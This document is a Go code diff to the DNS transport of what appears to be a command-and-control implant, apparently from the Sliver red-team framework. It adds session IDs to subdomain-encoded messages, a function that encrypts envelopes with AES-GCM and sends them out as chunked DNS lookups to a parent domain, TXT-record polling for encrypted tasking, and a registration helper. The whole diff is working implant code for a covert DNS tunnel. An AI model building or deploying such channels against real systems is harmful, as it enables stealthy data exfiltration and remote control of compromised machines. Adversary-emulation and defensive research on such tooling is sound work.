@@ -38,8 +38,9 @@ const (
 	blockReqMsg   = "b"
 	clearBlockMsg = "cb"
 
-	sessionInitMsg    = "si"
-	sessionPollingMsg = "sp"
+	sessionInitMsg     = "si"
+	sessionPollingMsg  = "sp"
+	sessionEnvelopeMsg = "se"
 
 	nonceStdSize = 6
 
@@ -108,7 +109,7 @@ func dnsLookup(domain string) (string, error) {
 }
 
 // Send raw bytes of an arbitrary length to the server
-func dnsSend(parentDomain string, msgType string, data []byte) (string, error) {
+func dnsSend(parentDomain string, msgType string, sessionID string, data []byte) (string, error) {
 
 	encoded := dnsEncodeToString(data)
 	log.Printf("Full msg: %#v", encoded)
@@ -117,7 +118,7 @@ func dnsSend(parentDomain string, msgType string, data []byte) (string, error) {
 	log.Printf("Encoded message length is: %d (size = %d)", len(encoded), size)
 	// {{end}}
 
-	nonce := dnsNonce(32) // Larger nonce for this use case
+	nonce := dnsNonce(20) // Larger nonce for this use case
 
 	// DNS domains are limited to 254 characters including '.' so that means
 	// Base 32 encoding, so (n*8 + 4) / 5 = 63 means we can encode 39 bytes
@@ -125,9 +126,9 @@ func dnsSend(parentDomain string, msgType string, data []byte) (string, error) {
 	// So we can send up to (3 * 39) 117 bytes encoded as 3x 63 character subdomains
 	// We have a 4 byte uint32 seqence number, max msg size (2**32) * 117 = 502511173632
 	//
-	// Format: (subdata...).(seq).(nonce).(_)(msgType).<parent domain>
-	//                [63].[63].[63].[4].[32].[3].
-	//                    ... ~234 chars ...
+	// Format: (subdata...).(seq).(nonce).(session id).(_)(msgType).<parent domain>
+	//                [63].[63].[63].[4].[20].[12].[3].
+	//                    ... ~235 chars ...
 	//                Max parent domain: ~20 chars
 	//
 	for index := 0; index < size; index++ {
@@ -167,15 +168,15 @@ func dnsSend(parentDomain string, msgType string, data []byte) (string, error) {
 
 		subdomain := strings.Join(subdata, ".")
 		seq := dnsEncodeToString(dnsDomainSeq(index))
-		domain := subdomain + fmt.Sprintf(".%s.%s.%s.%s", seq, nonce, msgType, parentDomain)
+		domain := subdomain + fmt.Sprintf(".%s.%s.%s.%s.%s", seq, nonce, sessionID, msgType, parentDomain)
 		_, err := dnsLookup(domain)
 		if err != nil {
 			return "", err
 		}
 
 	}
-	// A domain with no data means it's the end of the message
-	domain := fmt.Sprintf("%s.%s.%s", nonce, "_"+msgType, parentDomain)
+	// A domain with "_" before the msgType means we're doing sending data
+	domain := fmt.Sprintf("%s.%s.%s.%s", nonce, sessionID, "_"+msgType, parentDomain)
 	txt, err := dnsLookup(domain)
 	if err != nil {
 		return "", err
@@ -205,7 +206,7 @@ func dnsStartSession(parentDomain string) (string, AESKey, error) {
 		return "", AESKey{}, err
 	}
 
-	encryptedSessionID, err := dnsSend(parentDomain, sessionInitMsg, encryptedData)
+	encryptedSessionID, err := dnsSend(parentDomain, sessionInitMsg, "_", encryptedData)
 	if err != nil {
 		return "", AESKey{}, errors.New("Failed to start new DNS session")
 	}
@@ -289,6 +290,34 @@ func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
 	return getBlock(parentDomain, fields[0], fields[1])
 }
 
+// --------------------------- DNS SESSION SEND ---------------------------
+
+func dnsSessionSendEnvelope(parentDomain string, sessionID string, sessionKey AESKey, envelope *pb.Envelope) {
+
+	envelopeData, err := proto.Marshal(envelope)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("Failed to encode envelope %v", err)
+		// {{end}}
+		return
+	}
+
+	encryptedEnvelope, err := GCMEncrypt(sessionKey, envelopeData)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("Failed to encrypt session envelope %v", err)
+		// {{end}}
+		return
+	}
+
+	_, err = dnsSend(parentDomain, sessionEnvelopeMsg, sessionID, encryptedEnvelope)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("Failed to send session envelope %v", err)
+		// {{end}}
+	}
+}
+
 // --------------------------- DNS SESSION RECV ---------------------------
 
 func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ctrl chan bool, recv chan *pb.Envelope) {
@@ -298,18 +327,21 @@ func dnsSessionPoll(parentDomain string, sessionID string, sessionKey AESKey, ct
 			return
 		case <-time.After(pollInterval):
 			nonce := dnsNonce(nonceStdSize)
-			domain := fmt.Sprintf("_%s.%s._sp.%s", nonce, sessionID, parentDomain)
+			domain := fmt.Sprintf("_%s.%s.%s.%s", nonce, sessionID, sessionPollingMsg, parentDomain)
 			// {{if .Debug}}
 			log.Printf("[dns] lookup -> %s", domain)
 			// {{end}}
-			txts, err := net.LookupTXT(domain)
-			if err != nil || len(txts) < 1 {
+			txt, err := dnsLookup(domain)
+			if err != nil {
 				// {{if .Debug}}
-				log.Printf("Error while polling session %v", err)
+				log.Printf("Lookup error %v", err)
 				// {{end}}
-				break
 			}
-			rawTxt, _ := base64.RawStdEncoding.DecodeString(txts[0])
+			if txt == "0" {
+				continue
+			}
+
+			rawTxt, _ := base64.RawStdEncoding.DecodeString(txt)
 			pollData, err := GCMDecrypt(sessionKey, rawTxt)
 			dnsPoll := &pb.DNSPoll{}
 			err = proto.Unmarshal(pollData, dnsPoll)
@@ -464,6 +496,14 @@ func fetchRecvBlock(parentDomain string, reasm *BlockReassembler, start int, sto
 }
 
 // --------------------------- HELPERS ---------------------------
+
+func dnsRegisterSliver(send chan *pb.Envelope) {
+	// {{if .Debug}}
+	log.Printf("Sending registration information ...")
+	// {{end}}
+	registerEnvelope := getRegisterSliver()
+	send <- registerEnvelope
+}
 
 func dnsBlockHeaderID() string {
 	insecureRand.Seed(time.Now().UnixNano())
